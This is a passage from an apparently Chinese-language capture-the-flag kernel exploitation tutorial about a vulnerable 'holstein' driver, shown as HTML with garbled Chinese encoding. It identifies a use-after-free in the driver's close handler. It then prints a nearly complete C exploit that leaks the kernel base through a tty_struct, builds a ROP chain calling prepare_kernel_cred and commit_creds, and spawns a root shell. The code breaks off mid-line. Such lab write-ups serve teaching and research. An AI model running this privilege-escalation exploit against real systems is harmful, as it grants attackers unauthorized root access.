number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token punctuation">(</span>_DWORD<span class="token punctuation">)</span>result <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_2D0<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token function">unregister_chrdev_region</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span>dev_id<span class="token punctuation">,</span> <span class="token number">1LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token number">4294967280LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>&#x2F;dev&#x2F;holsteinè®¾å¤‡</p><h4 id="module-open"><a href="#module-open" class="headerlink" title="module_open"></a>module_open</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_open</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token keyword">unsigned</span> <span class="token keyword">int</span> v0<span class="token punctuation">;</span> <span class="token comment">// edx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_283<span class="token punctuation">)</span><span class="token punctuation">;</span>  g_buf <span class="token operator">=</span> <span class="token function">kmem_cache_alloc</span><span class="token punctuation">(</span>kmalloc_caches<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token number">3520LL</span><span class="token punctuation">)</span><span class="token punctuation">;</span>  v0 <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token operator">!</span>g_buf <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_299<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span><span class="token keyword">unsigned</span> <span class="token keyword">int</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">12</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> v0<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>2çš„10æ¬¡æ–¹ï¼Œå³0x400ï¼Œåˆ†é…äº†0x400çš„å†…å­˜</p><h4 id="module-read"><a href="#module-read" class="headerlink" title="module_read"></a>module_read</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_read</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_20F<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token function">copy_to_user</span><span class="token punctuation">(</span>buf<span class="token punctuation">,</span> g_buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_23C<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_225<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sizeéœ€è¦å°äº0x400</p><h4 id="module-write"><a href="#module-write" class="headerlink" title="module_write"></a>module_write</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall <span class="token function">module_write</span><span class="token punctuation">(</span>__int64 a1<span class="token punctuation">,</span> __int64 buf<span class="token punctuation">,</span> <span class="token keyword">unsigned</span> __int64 size<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  __int64 result<span class="token punctuation">;</span> <span class="token comment">// rax</span>  __int64 v5<span class="token punctuation">;</span> <span class="token comment">// rdx</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_253<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token keyword">if</span> <span class="token punctuation">(</span> size <span class="token operator">&lt;=</span> <span class="token number">0x400</span> <span class="token punctuation">)</span>  <span class="token punctuation">&#123;</span>    v5 <span class="token operator">=</span> <span class="token function">copy_from_user</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> size<span class="token punctuation">)</span><span class="token punctuation">;</span>    result <span class="token operator">=</span> size<span class="token punctuation">;</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span> v5 <span class="token punctuation">)</span>    <span class="token punctuation">&#123;</span>      <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_26A<span class="token punctuation">)</span><span class="token punctuation">;</span>      <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">else</span>  <span class="token punctuation">&#123;</span>    <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_225<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">22LL</span><span class="token punctuation">;</span>  <span class="token punctuation">&#125;</span>  <span class="token keyword">return</span> result<span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>sizeéœ€è¦å°äº0x400</p><h4 id="module-close"><a href="#module-close" class="headerlink" title="module_close"></a>module_close</h4><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1F8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//UAF</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœªç½®ç©ºæŒ‡é’ˆï¼Œå­˜åœ¨UAF</p><h2 id="äºŒ-åˆ©ç”¨æ€è·¯"><a href="#äºŒ-åˆ©ç”¨æ€è·¯" class="headerlink" title="(äºŒ)åˆ©ç”¨æ€è·¯"></a>(äºŒ)åˆ©ç”¨æ€è·¯</h2><h3 id="UAFçš„åˆ©ç”¨"><a href="#UAFçš„åˆ©ç”¨" class="headerlink" title="UAFçš„åˆ©ç”¨"></a>UAFçš„åˆ©ç”¨</h3><p>è·Ÿä¸Šä¸€èŠ‚ä¸åŒçš„æ˜¯ï¼Œreadå’Œwriteè¿›è¡Œäº†é•¿åº¦é™åˆ¶ï¼Œæ— æ³•æº¢å‡ºï¼ˆè¿˜æ‰£æ‰äº†ç¬¦å·è¡¨ï¼‰</p><p>æˆ‘ä»¬æ¥çœ‹çœ‹closeçš„å®ç°</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">module_close</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>  <span class="token function">printk</span><span class="token punctuation">(</span><span class="token operator">&amp;</span>unk_1F8<span class="token punctuation">)</span><span class="token punctuation">;</span>  <span class="token function">kfree</span><span class="token punctuation">(</span>g_buf<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//UAF</span>  <span class="token keyword">return</span> <span class="token number">0LL</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>g_bufçš„æŒ‡é’ˆæœªå¾—åˆ°æ›´æ–°ï¼Œå­˜åœ¨UAFã€‚</p><p>ä½†æ˜¯æœ‰äº›è¯»è€…å¯èƒ½ä¼šæƒ³ï¼Œè™½ç„¶æœ‰UAFï¼Œä½†æ˜¯closeåæˆ‘ä¹Ÿä¸èƒ½å¯¹è¯¥<code>fd</code>åšä¾‹å¦‚readã€writeç­‰ä»»ä½•äº‹æƒ…ã€‚è¿™å½“ç„¶æ˜¯æ­£ç¡®çš„ï¼Œä½†è®©æˆ‘ä»¬å›æƒ³ä¸€ä¸‹åœ¨å†…æ ¸ç©ºé—´ä¸­è¿è¡Œçš„ç¨‹åºçš„ç‰¹å¾ã€‚</p><p>å†…æ ¸ç©ºé—´å…è®¸å¤šä¸ªç¨‹åºå…±äº«ç›¸åŒçš„èµ„æºï¼Œè¯¥æ¨¡å—å…è®¸openå¤šä¸ªç¨‹åºï¼Œå¦‚æœæˆ‘ä»¬è¿™æ ·ä½¿ç”¨å®ƒï¼š</p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">int</span> fd1 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">"/dev/holstein"</span> <span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token keyword">int</span> fd2 <span class="token operator">=</span> <span class="token function">open</span><span class="token punctuation">(</span> <span class="token string">"/dev/holstein"</span> <span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> <span class="token string">"X1NRI"</span> <span class="token punctuation">,</span> <span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>ç¬¬ä¸€ä¸ªopenåˆ†é…äº†g_bufï¼Œä¸‹ä¸€ä¸ªopenåˆä½¿g_bufè¢«æ–°ç¼“å†²åŒºæ›¿ä»£ï¼ˆ<strong>åŸæ¥çš„g_bufæœªé‡Šæ”¾ï¼Œcloseæ‰çš„æ˜¯æ–°çš„g_buf</strong>ï¼‰ã€‚è™½ç„¶fd1ä¸å¯ä½¿ç”¨ï¼Œä½†æ˜¯fd1ä¸fd2å…±åŒæŒ‡å‘è¯¥é©±åŠ¨ï¼Œæ­¤æ—¶é€šè¿‡å¯¹fd2è¿›è¡Œæ“ä½œï¼Œæˆ‘ä»¬ä»ç„¶èƒ½å¤Ÿæ“çºµg_bufæŒ‡å‘çš„å·²é‡Šæ”¾ç©ºé—´ã€‚</p><blockquote><p>æ€è€ƒï¼šå¦‚æœåœ¨å…³é—­æ—¶åˆ é™¤å¸¦æœ‰ NULL çš„æŒ‡é’ˆæ¥é˜²æ­¢åƒè¿™æ ·çš„ç®€å•æ¼æ´ï¼Œæˆ–è€…åˆ›å»ºä¸€ç§å¦‚æœåœ¨æ‰“å¼€æ—¶å·²åˆ†é… g_buf åˆ™ä¼šå¤±è´¥çš„è®¾è®¡ï¼Œé¿å…äº†UAFæ˜¯å¦å°±ä¸‡äº‹å¤§å‰äº†ï¼Ÿã€‚æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€ç« ä¸­äº†è§£è¿™æ˜¯å¦çœŸçš„è¶³å¤Ÿä¿è¯å®‰å…¨ã€‚</p></blockquote><h3 id="å †å–·å°„"><a href="#å †å–·å°„" class="headerlink" title="å †å–·å°„"></a>å †å–·å°„</h3><p>ç»è¿‡è°ƒè¯•ï¼Œä¸éœ€è¦sprayå…¶å®å°±èƒ½å¤Ÿå¾—åˆ°ç›®æ ‡å†…å­˜</p><h3 id="å¯¹ttyç»“æ„ä½“çš„ç ´åé—®é¢˜"><a href="#å¯¹ttyç»“æ„ä½“çš„ç ´åé—®é¢˜" class="headerlink" title="å¯¹ttyç»“æ„ä½“çš„ç ´åé—®é¢˜"></a>å¯¹ttyç»“æ„ä½“çš„ç ´åé—®é¢˜</h3><p>ä¸ºäº†ç»•è¿‡SMEPå’ŒSMAPï¼Œæˆ‘ä»¬éœ€è¦æ„é€ kROPã€‚ä¸å †æº¢å‡ºç›¸ä¼¼çš„åœ°æ–¹ç•¥å»ä¸è°ˆã€‚å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œç°åœ¨ä½¿ç”¨çš„åŒºåŸŸæ˜¯ä¸tty_structé‡å çš„ã€‚<strong>tty_operationsæœ‰å¾ˆå¤šæœªå¼•ç”¨çš„å˜é‡åœ¨tty_structä¸­ï¼Œå½“æˆ‘ä»¬è§¦å‘æ—¶ï¼Œç”±äºç ´åäº†å…¶å®ƒç»“æ„å¯èƒ½ä¼šå¼•èµ·æ„æƒ³ä¸åˆ°çš„çš„é”™è¯¯</strong>ã€‚å› æ­¤æˆ‘ä»¬æƒ³è®©ropchainåœ¨ä¸€ä¸ªå•ç‹¬çš„åŒºåŸŸã€‚</p><ul><li>æˆ‘ä»¬çš„å¯¹ç­–æ˜¯è¿›è¡Œä¸¤æ¬¡UAFï¼Œç¬¬ä¸€ä¸ªUAFåœ¨tty_structä¸Šå†™ropchainå’Œå¸ƒç½®å‡½æ•°è¡¨ï¼›ç¬¬äºŒä¸ªUAFæ”¹tty_struct.opså¹¶è§¦å‘ã€‚</li></ul><h2 id="ä¸‰-EXP"><a href="#ä¸‰-EXP" class="headerlink" title="(ä¸‰)EXP"></a>(ä¸‰)EXP</h2><p>æ”¾ä¸€å¼ brant-ruanå¤§ä½¬çš„æ€è·¯å›¾ï¼š<br><img src="/EXP_FILE/f58c762a8b7f43dc678dc8273e56a845_MD5.jpeg"></p><pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdio.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;string.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;stdlib.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;unistd.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/types.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/stat.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;fcntl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">include</span> <span class="token string">&lt;sys/ioctl.h></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RDI_RET</span> <span class="token expression"><span class="token number">0xffffffff8114078a</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">PUSH_RDX_POP_RSP_POP_RBP_RET</span> <span class="token expression"><span class="token number">0xffffffff8114fbea</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">MOV_RDI_RAX_REP_MOVSQ_RET</span> <span class="token expression"><span class="token number">0xffffffff81638e9b</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token macro property"><span class="token directive-hash">#</span><span class="token directive keyword">define</span> <span class="token macro-name">POP_RCX_RET</span> <span class="token expression"><span class="token number">0xffffffff8150b6d6</span><span class="token operator">+</span>koff<span class="token punctuation">;</span></span></span><span class="token comment">/*user_cs;user_rflags;user_sp;user_ss;*/</span><span class="token class-name">size_t</span> prepare_kernel_cred<span class="token operator">=</span><span class="token number">0xffffffff81072560</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> commit_creds<span class="token operator">=</span><span class="token number">0xffffffff810723c0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> swapgs_restore_regs_and_return_to_usermode<span class="token operator">=</span><span class="token number">0xffffffff81800e10</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> user_cs<span class="token punctuation">,</span>user_ss<span class="token punctuation">,</span>user_rsp<span class="token punctuation">,</span>user_rflags<span class="token punctuation">;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">asm</span> <span class="token keyword">volatile</span><span class="token punctuation">(</span><span class="token string">"mov %0,cs;"</span><span class="token string">"mov %1,ss;"</span><span class="token string">"mov %2,rsp;"</span><span class="token string">"pushf;"</span><span class="token string">"pop %3;"</span>    <span class="token operator">:</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_cs<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_ss<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rsp<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">"=r"</span><span class="token punctuation">(</span>user_rflags<span class="token punctuation">)</span> <span class="token operator">:</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[*] Success to saveStatus!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">errExit</span><span class="token punctuation">(</span><span class="token keyword">char</span> <span class="token operator">*</span> msg<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\0330xffffffff812f5003[1;31m[-] Error : %s\033[0m\n"</span><span class="token punctuation">,</span> msg<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token function">exit</span><span class="token punctuation">(</span>EXIT_FAILURE<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">static</span> <span class="token keyword">void</span> <span class="token function">getRootShell</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">getuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31;37m[*] &lt;Successfully Get Root Privileges>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">system</span><span class="token punctuation">(</span><span class="token string">"/bin/sh"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"\033[1;31m[-] &lt;Get Root Error>\033[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">int</span> <span class="token function">main</span><span class="token punctuation">(</span><span class="token keyword">int</span> argc<span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>argv<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span> <span class="token keyword">char</span> <span class="token operator">*</span>envp<span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">saveStatus</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd1<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd2<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd1 <span class="token operator">||</span> fd2<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein Open Failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd1<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd1<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bss 0xffffffffc00023c0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd1<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">char</span> buf<span class="token punctuation">[</span><span class="token number">0x400</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token function">read</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> buf<span class="token punctuation">,</span> <span class="token number">0x100</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> koff<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x18</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0xc39c60</span><span class="token operator">-</span><span class="token number">0xffffffff81000000</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> heap<span class="token operator">=</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span class="token punctuation">[</span><span class="token number">0x38</span><span class="token punctuation">]</span><span class="token operator">-</span><span class="token number">0x38</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] koff => 0x%lx\n"</span><span class="token punctuation">,</span>koff<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[*] ropchain => 0x%lx\n"</span><span class="token punctuation">,</span>heap<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span><span class="token class-name">size_t</span> ropchain<span class="token punctuation">[</span><span class="token number">0x40</span><span class="token punctuation">]</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RDI_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>prepare_kernel_cred<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>POP_RCX_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>MOV_RDI_RAX_REP_MOVSQ_RET<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>commit_creds<span class="token operator">+</span>koff<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>swapgs_restore_regs_and_return_to_usermode<span class="token operator">+</span>koff<span class="token operator">+</span><span class="token number">22</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token number">0xdeadbeef</span><span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token class-name">size_t</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>getRootShell<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_cs<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rflags<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_rsp<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token operator">=</span>user_ss<span class="token punctuation">;</span>ropchain<span class="token punctuation">[</span><span class="token number">0x30</span><span class="token punctuation">]</span><span class="token operator">=</span>PUSH_RDX_POP_RSP_POP_RBP_RET<span class="token punctuation">;</span><span class="token function">write</span><span class="token punctuation">(</span>fd2<span class="token punctuation">,</span> ropchain<span class="token punctuation">,</span> <span class="token keyword">sizeof</span><span class="token punctuation">(</span>ropchain<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd3<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> fd4<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>fd3 <span class="token operator">||</span> fd4<span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"/dev/holstein Open Failed\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token function">close</span><span class="token punctuation">(</span>fd3<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">int</span> tty_fd2<span class="token operator">=</span><span class="token function">open</span><span class="token punctuation">(</span><span class="token string">"/dev/ptmx"</span><span class="token punctuation">,</span> O_RDWR<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//bss 0xffffffffc00023c0</span><span class="token keyword">if</span> <span class="token punctuation">(</span>tty_fd2<span class="token operator">></span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[+] /dev/ptmx Opened\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token operator">*</span><span class="token punctuation">(</span><span class="token class-name">size_t</span> <span class="token operator">*</span><span class="token punctuation">)</span><span class="token operator">&amp;</span>buf<span 